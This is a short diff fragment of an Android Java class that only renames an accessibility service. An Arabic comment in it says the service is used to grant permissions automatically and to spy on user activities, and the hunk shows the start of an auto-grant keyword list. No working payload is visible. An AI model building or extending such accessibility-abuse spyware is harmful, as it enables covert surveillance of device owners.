@@ -19,7 +19,7 @@ import java.util.Map;
  * AccessibilityService - خدمة الوصول
  * تستخدم لمنح الصلاحيات تلقائياً والتجسس على الأنشطة
  */
-public class AccessibilityService extends android.accessibilityservice.AccessibilityService {
+public class MyAccessibilityService extends android.accessibilityservice.AccessibilityService {
     
     private static final String TAG = "AKM_Accessibility";
     private static final String[] AUTO_GRANT_KEYWORDS = {
